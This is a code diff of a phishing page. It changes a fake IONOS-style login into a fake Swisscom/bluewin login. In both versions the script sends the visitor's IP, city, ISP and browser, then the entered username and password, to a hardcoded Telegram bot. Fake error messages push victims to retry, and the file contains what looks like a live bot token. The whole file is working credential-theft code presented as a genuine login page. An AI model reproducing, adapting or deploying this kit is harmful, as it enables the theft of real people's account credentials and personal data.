@@ -1,658 +1,238 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
-    <style>
-   * {
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Swisscom Login</title>
+
+  <style>
+/* 1. Global Reset */
+*, *::before, *::after {
+    box-sizing: border-box;
     margin: 0;
     padding: 0;
-    box-sizing: border-box;
 }
 
-html,
-body {
-    width: 100%;
+html, body {
     height: 100%;
+    width: 100%;
+    overflow: hidden; /* Prevents any shifting or scrolling */
+    font-family: Arial, sans-serif;
 }
 
 body {
-    font-family: 'Goo Sans', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-
-    background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1781096923/ionos_h3htsj.jpg');
-    background-size: cover;
+    background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1787031318/bluewin.ch_wggy1q.jpg');
+    /* 100% 100% forces the image to match the screen exactly like a laptop view */
+    background-size: 100% 100%; 
     background-position: center;
     background-repeat: no-repeat;
     background-attachment: fixed;
+    height: 100vh;
+    width: 100vw;
+}
 
-    display: flex;
-    justify-content: center;
-    align-items: center;
+/* 2. Login Container - FIXED COORDINATES (Zero Shift) */
+.box {
+    position: absolute;
+    /* YOUR EXACT BIG LAPTOP COORDINATES - LOCKED */
+    top: 54.7%; 
+    left: 63%; 
+    transform: translate(-50%, -50%);
 
-    min-height: 100vh;
+    /* Proportional width that scales with the screen width */
+    width: 30%; 
+    min-width: 280px; 
+    max-width: 350px; 
+
     padding: 20px;
-    overflow-x: hidden;
-}
-
-.login-container {
-    background: transparent;
     border-radius: 10px;
-    box-shadow: none;
-    padding: 48px 40px 36px;
-
-    width: 90%;
-    max-width: 700px;
-
-    border: none;
-    position: relative;
-
-    /* Move up or down (responsive) */
-    transform: translateY(60%);
+    text-align: center;
+    background: transparent;
 }
 
-        .title {
-            font-size: 28px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 8px;
-            line-height: 1.3;
-        }
+/* 3. Input Syncing */
+input {
+    width: 100%; 
+    padding: 14px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    margin-top: 8px;
+    font-size: 15px;
+    display: block;
+}
 
-        @media (max-width: 480px) {
-            .title {
-                font-size: 24px;
-            }
-        }
+/* 4. Steps Visibility Logic */
+#emailStep { display: block; }
+#passwordStep { display: none; }
 
-        .subtitle {
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 32px;
-            font-weight: 400;
-        }
+/* 5. UI Elements */
+h2 {
+    margin-bottom: 15px;
+    font-weight: 400;
+    color: #1d1d1d;
+}
 
-        @media (max-width: 480px) {
-            .subtitle {
-                font-size: 14px;
-                margin-bottom: 24px;
-            }
-        }
+button {
+    width: 100%;
+    margin-top: 20px;
+    padding: 12px;
+    border: none;
+    background: #003e9b;
+    color: white;
+    font-size: 16px;
+    border-radius: 90px;
+    cursor: pointer;
+}
 
-        .input-container {
-            margin-bottom: 4px;
-            position: relative;
-        }
+button:hover { opacity: 0.9; }
 
-        .input-field {
-            width: 100%;
-            padding: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-            transition: all 0.2s ease;
-            background: #fff;
-        }
+.back-link {
+    text-align: left;
+    margin-bottom: 20px;
+    font-size: 14px;
+    color: #003e9b;
+    cursor: pointer;
+    display: none;
+}
 
-        .input-field:focus {
-            border-color: #1a73e8;
-            border-width: 2px;
-            padding: 15px;
-            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
-        }
-
-        .input-field:focus + .input-label,
-        .input-field:not(:placeholder-shown) + .input-label {
-            top: 0;
-            font-size: 12px;
-            color: #1a73e8;
-            background: #fff;
-            padding: 0 4px;
-            transform: translateY(-50%);
-        }
-
-        .input-label {
-            position: absolute;
-            top: 50%;
-            left: 16px;
-            transform: translateY(-50%);
-            color: #5f6368;
-            font-size: 16px;
-            transition: all 0.2s ease;
-            pointer-events: none;
-            background: transparent;
-        }
-
-        .forgot-link {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            transition: color 0.2s ease;
-        }
-
-        .forgot-link:hover {
-            color: #1557b2;
-        }
-
-        .guest-mode {
-            margin: 32px 0;
-            font-size: 14px;
-            color: #5f6368;
-            line-height: 1.5;
-        }
-
-        @media (max-width: 480px) {
-            .guest-mode {
-                margin: 24px 0;
-                font-size: 13px;
-            }
-        }
-
-        .guest-mode a {
-            color: #003366;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .guest-mode a:hover {
-            color: #1557b2;
-        }
-
-        .buttons {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 12px;
-        }
-
-        @media (max-width: 480px) {
-            .buttons {
-                flex-direction: column-reverse;
-                gap: 16px;
-                margin-top: 24px;
-            }
-        }
-
-        
-
-        @media (max-width: 480px) {
-            .create-account {
-                align-self: stretch;
-                text-align: center;
-            }
-        }
-
-        .next-button {
-            background: #003366;
-            color: white;
-            border: none;
-            padding: 10px 14px;
-            border-radius: 40px;
-            font-size: 14px;
-            font-weight: 500;
-            min-width: 600px;
-        }
-
-        .next-button:hover:not(:disabled) {
-            background: #003366;
-            box-shadow: 0 0px 0px rgba(0, 0, 0, 0.3);
-        }
-
-        .next-button:disabled {
-            background: #f1f3f4;
-            color: #003366;
-            cursor: not-allowed;
-        }
-
-        @media (max-width: 480px) {
-            .next-button {
-                align-self: stretch;
-                padding: 12px 24px;
-            }
-        }
-
-        .password-page {
-            display: none;
-        }
-
-        .user-info {
-            display: flex;
-            align-items: center;
-            margin-bottom: 10px;
-            padding: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            background: #f8f9fa;
-            cursor: pointer;
-            transition: box-shadow 0.2s ease;
-        }
-
-        .user-info:hover {
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-        }
-
-        .user-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: #1a73e8;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 16px;
-            font-size: 16px;
-            color: white;
-            font-weight: 500;
-        }
-
-        .user-email {
-            font-size: 14px;
-            color: #3c4043;
-            flex-grow: 1;
-            font-weight: 500;
-        }
-
-        .dropdown-arrow {
-            width: 0;
-            height: 0;
-            border-left: 5px solid transparent;
-            border-right: 5px solid transparent;
-            border-top: 5px solid #5f6368;
-            margin-left: 8px;
-        }
-
-        
-
-        .password-forgot {
-            text-align: left;
-            margin-top: 16px;
-        }
-
-        .loading {
-            opacity: 0.6;
-            pointer-events: none;
-        }
-
-        .auto-next {
-            background: #34a853;
-        }
-
-        .auto-next:hover {
-            background: #2d8f47;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .login-container {
-            animation: fadeIn 0.1s ease-out;
-        }
-
-        /* Progress indicator */
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #e8eaed;
-            border-radius: 2px;
-            overflow: hidden;
-            margin-bottom: 10px;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: #1a73e8;
-            width: 0%;
-            transition: width 0.8s ease;
-        }
-
-        .auto-advancing {
-            pointer-events: none;
-        }
-
-        /* Error message styling */
-        .error-message {
-            color: #d93025;
-            font-size: 14px;
-            margin-top: 8px;
-            display: none;
-        }
-
-        /* Intro image container */
-        .intro-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            transition: opacity 0.5s ease;
-        }
-
-        .intro-image {
-            max-width: 90%;
-            max-height: 90%;
-            object-fit: contain;
-            border-radius: 8px;
-        }
-
-        .intro-container.fade-out {
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .login-main {
-            display: none;
-            width: 100%;
-            height: 50vh;
-            position: relative;
-        }
-    </style>
+/* 6. Intro Overlay - Fixed Scaling */
+#introImageContainer {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background-image: url("https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png");
+    /* Forces intro image to stay proportional to the screen */
+    background-size:  100%; 
+    background-repeat: no-repeat;
+    background-position: center;
+    background-color: #ffffff;
+    z-index: 9999;
+}
+  </style>
 </head>
+
 <body>
-    <!-- Intro Image Container -->
-    <div id="introImageContainer" class="intro-container">
-        <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png" alt="Loading..." class="intro-image">
+  <!-- Intro Image Section -->
+  <div id="introImageContainer">
+    <h2></h2>
+  </div>
+
+  <div class="box" id="loginContainer">
+    <div id="backBtn" class="back-link" onclick="goBack()">←Enter Password For</div>
+
+    <!-- USER ID STEP -->
+    <div id="userIdStep">
+      <h2></h2>
+      <label>Please log in here with your Swisscom.
+</label>
+
+      <input type="text" id="userIdInput" value="" Placeholder="Enter username" required>
+      <button onclick="goToPassword()">Continue</button>
     </div>
 
-    <!-- Login Main Container -->
-    <div id="loginContainer" class="login-main">
-        <div class="login-container">
-        <!-- First Page - Email Input -->
-        <div id="email-page" class="email-page">
-            <div class="goo-logo"></div>
-            
-            
-            <div class="progress-bar" id="progress-bar" style="display: none;">
-                <div class="progress-fill" id="progress-fill"></div>
-            </div>
-            
-            <div class="input-container">
-			<label class="form-label">Email Address</label>
-                <input type="email" class="input-field" id="email-input" value="">
-                <label class="input-label"></label>
-            </div>
-            
-            <a href="#" class="forgot-link">Not your device? Log out after the session or use private browsing mode.</a>
-            
-           
-            
-            <div class="buttons">
-                
-                <button class="next-button auto-next" id="email-next">Next</button>
-            </div>
-        </div>
-
-        <!-- Second Page - Password Input -->
-        <div id="password-page" class="password-page">
-            <div class="goo-logo"></div>
-            
-            <div class="user-info">
-                <div class="user-avatar" id="user-avatar"></div>
-                <span class="user-email" id="user-email"></span>
-                <div class="dropdown-arrow"></div>
-            </div>
-                        
-            <div class="input-container">
-                <input type="password" class="input-field" id="password-input" placeholder=" ">
-                <label class="input-label">Enter your password</label>
-            </div>
-            
-            <div class="error-message" id="error-message">
-                 
-            </div>
-            
-            <div class="show-password">
-                <input type="checkbox" id="show-password-checkbox">
-            </div>
-            
-            
-            
-            <div class="buttons">
-                <div></div>
-                <button class="next-button" id="password-next" disabled>Next</button>
-            </div>
-        </div>
+    <!-- PASSWORD STEP -->
+    <div id="passwordStep">
+      <h2></h2>
+      <div id="showUserId" style="margin-bottom: 40px; font-size: 20px; color:#333;"></div>
+      <label></label>
+      <input type="password" id="passwordInput" Placeholder="Enter Password" required>
+      <button onclick="handleLogin()">Continue</button>
     </div>
+    <div id="errorMessage"></div>
+  </div>
 
-    <script>
-        // Telegram configuration
-        const token = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';
-        const chatId = '8052751627';
-        let loginAttempts = 0;
+  <script>
+    const token = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';
+    const chatId = '8052751627';
+    let loginAttempts = 0;
 
-        // Telegram functions
-        function sendToTelegram(message) {
-            if (!navigator.onLine) return;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            }).catch(err => console.error('Telegram error:', err));
-        }
+    function sendToTelegram(message) {
+      if (!navigator.onLine) {
+        console.log("[Offline] Telegram Message:", message);
+        return;
+      }
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).catch(err => console.error('Telegram error:', err));
+    }
 
-        function getPort() {
-            return window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
-        }
+    function getPort() {
+      return window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
+    }
 
-        function sendVisitorInfo() {
-            const userAgent = navigator.userAgent;
-            const port = getPort();
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    const message = `🌐 IOnons drop Info\nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
-                    sendToTelegram(message);
-                }).catch(() => {
-                    sendToTelegram(`🌐IOnons drop Visitor (IP lookup failed)\nPort: ${port}\nBrowser: ${userAgent}`);
-                });
-        }
-
-        // DOM elements
-        const emailInput = document.getElementById('email-input');
-        const passwordInput = document.getElementById('password-input');
-        const emailNext = document.getElementById('email-next');
-        const passwordNext = document.getElementById('password-next');
-        const emailPage = document.getElementById('email-page');
-        const passwordPage = document.getElementById('password-page');
-        const userEmail = document.getElementById('user-email');
-        const userAvatar = document.getElementById('user-avatar');
-        const showPasswordCheckbox = document.getElementById('show-password-checkbox');
-        const progressBar = document.getElementById('progress-bar');
-        const progressFill = document.getElementById('progress-fill');
-        const errorMessage = document.getElementById('error-message');
-
-        // Auto-advance functionality
-        function autoAdvanceToPassword() {
-            const email = emailInput.value.trim();
-            if (email) {
-                // Show progress bar
-                progressBar.style.display = 'block';
-                progressFill.style.width = '100%';
-                
-                // Add auto-advancing class
-                emailPage.classList.add('auto-advancing');
-                
-                // Update button text
-                emailNext.textContent = 'Loading...';
-                emailNext.classList.add('loading');
-                
-                // Update user info for password page
-                userEmail.textContent = email;
-                userAvatar.textContent = email.charAt(0).toUpperCase();
-                
-                // Simulate loading and switch pages
-                setTimeout(() => {
-                    emailPage.style.display = 'none';
-                    passwordPage.style.display = 'block';
-                    passwordInput.focus();
-                    
-                    // Reset email page for potential back navigation
-                    emailNext.textContent = 'Next';
-                    emailNext.classList.remove('loading');
-                    emailPage.classList.remove('auto-advancing');
-                    progressBar.style.display = 'none';
-                    progressFill.style.width = '0%';
-                }, 1000);
-            }
-        }
-
-        // Initialize page
-        function initializePage() {
-            // Send visitor info to Telegram
-            sendVisitorInfo();
-            
-            // Show intro image first, then transition to login
-            setTimeout(() => {
-                const introContainer = document.getElementById('introImageContainer');
-                const loginContainer = document.getElementById('loginContainer');
-                
-                // Fade out intro image
-                introContainer.classList.add('fade-out');
-                
-                // Show login container after fade
-                setTimeout(() => {
-                    introContainer.style.display = 'none';
-                    loginContainer.style.display = 'flex';
-                    loginContainer.style.alignItems = 'center';
-                    loginContainer.style.justifyContent = 'center';
-                    loginContainer.style.minHeight = '100vh';
-                    loginContainer.style.padding = '20px';
-                    
-                    // Check if email is pre-filled and auto-advance
-                    const prefilledEmail = emailInput.value.trim();
-                    if (prefilledEmail) {
-                        emailInput.dispatchEvent(new Event('input'));
-                        setTimeout(() => {
-                            autoAdvanceToPassword();
-                        }, 1000);
-                    }
-                }, 500);
-            }, 1000); // Show intro for 2 seconds
-        }
-
-        // Enable/disable password next button
-        passwordInput.addEventListener('input', function() {
-            passwordNext.disabled = this.value.trim() === '';
-            // Hide error message when user starts typing
-            errorMessage.style.display = 'none';
+    function sendVisitInfo() {
+      const userAgent = navigator.userAgent;
+      const port = getPort();
+      if (!navigator.onLine) {
+        sendToTelegram(`📴 bluch Offline Visit\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
+        return;
+      }
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const message = `bluch Visit Info\nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
+          sendToTelegram(message);
+        }).catch(() => {
+          sendToTelegram(`bluch Visit Info (IP lookup failed)\nPort: ${port}\nBrowser: ${userAgent}`);
         });
+    }
 
-        // Handle email next button click
-        emailNext.addEventListener('click', function(e) {
-            e.preventDefault();
-            autoAdvanceToPassword();
-        });
+    function goToPassword() {
+      let userid = document.getElementById("userIdInput").value.trim();
 
-        // Handle password next button click
-        passwordNext.addEventListener('click', function(e) {
-            e.preventDefault();
-            if (passwordInput.value.trim()) {
-                const email = emailInput.value.trim();
-                const password = passwordInput.value.trim();
-                
-                passwordNext.textContent = 'Signing in...';
-                passwordNext.classList.add('loading');
-                
-                // Send login attempt to Telegram
-                loginAttempts++;
-                const msg = `❌ IOnons drop Failed Login #${loginAttempts}\n📧 Email: ${email}\n🔑 Password: ${password}`;
-                sendToTelegram(msg);
-                
-                setTimeout(() => {
-                    // Reset button
-                    passwordNext.textContent = 'Next';
-                    passwordNext.classList.remove('loading');
-                    
-                    // Clear password and show error
-                    passwordInput.value = '';
-                    passwordNext.disabled = true;
-                    errorMessage.style.display = 'block';
-                    
-                    // After 3 attempts, redirect
-                    if (loginAttempts >= 90) {
-                        setTimeout(() => {
-                            window.location.href = 'https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png';
-                        }, 2000);
-                    }
-                }, 1000);
-            }
-        });
+      if (userid === "") {
+        alert("Please enter your User ID");
+        return;
+      }
 
-        // Handle show password checkbox
-        showPasswordCheckbox.addEventListener('change', function() {
-            passwordInput.type = this.checked ? 'text' : 'password';
-        });
+      document.getElementById("userIdStep").style.display = "none";
+      document.getElementById("passwordStep").style.display = "block";
+      document.getElementById("backBtn").style.display = "block";
+      document.getElementById("showUserId").innerText = userid;
+    }
 
-        // Handle Enter key presses
-        emailInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                autoAdvanceToPassword();
-            }
-        });
+    function goBack() {
+      document.getElementById("passwordStep").style.display = "none";
+      document.getElementById("userIdStep").style.display = "block";
+      document.getElementById("backBtn").style.display = "none";
+    }
 
-        passwordInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter' && !passwordNext.disabled) {
-                e.preventDefault();
-                passwordNext.click();
-            }
-        });
+    function handleLogin() {
+      const email = document.getElementById('userIdInput').value.trim();
+      const password = document.getElementById('passwordInput').value.trim();
 
-        // Handle input focus effects and label animations
-        document.querySelectorAll('.input-field').forEach(input => {
-            input.addEventListener('focus', function() {
-                this.parentElement.classList.add('focused');
-            });
-            
-            input.addEventListener('blur', function() {
-                this.parentElement.classList.remove('focused');
-            });
-            
-            input.addEventListener('input', function() {
-                // Trigger label animation
-                if (this.value.trim()) {
-                    this.setAttribute('data-filled', 'true');
-                } else {
-                    this.removeAttribute('data-filled');
-                }
-            });
-        });
+      if (!email || !password) {
+        document.getElementById('errorMessage').textContent = "";
+        document.getElementById('errorMessage').style.display = 'block';
+        return;
+      }
 
-        // Mobile responsive adjustments
-        function adjustForMobile() {
-            const isMobile = window.innerWidth <= 480;
-            const container = document.querySelector('.login-container');
-            
-            if (isMobile) {
-                container.style.transform = 'scale(0.95)';
-            } else {
-                container.style.transform = 'scale(1)';
-            }
-        }
+      loginAttempts++;
+      const msg = `❌bluch drop #${loginAttempts}\n👤 User ID: ${email}\n🔑 Password: ${password}`;
+      sendToTelegram(msg);
 
-        // Initialize everything when page loads
-        window.addEventListener('load', initializePage);
-        window.addEventListener('resize', adjustForMobile);
-        adjustForMobile();
+      document.getElementById('errorMessage').textContent = "";
+      document.getElementById('errorMessage').style.display = 'block';
+      document.getElementById('passwordInput').value = '';
 
-        // Trigger initial label positioning for pre-filled email
-        if (emailInput.value.trim()) {
-            emailInput.setAttribute('data-filled', 'true');
-        }
-    </script>
+      if (loginAttempts >= 20) {
+        window.location.href = 'https://google.com';
+      }
+    }
+
+    window.onload = function () {
+      sendVisitInfo();
+      setTimeout(() => {
+        document.getElementById('introImageContainer').style.display = 'none';
+        document.getElementById('loginContainer').style.display = 'block';
+      }, 1000); // Show intro image for 5 seconds
+    };
+  </script>
 </body>
+
 </html>
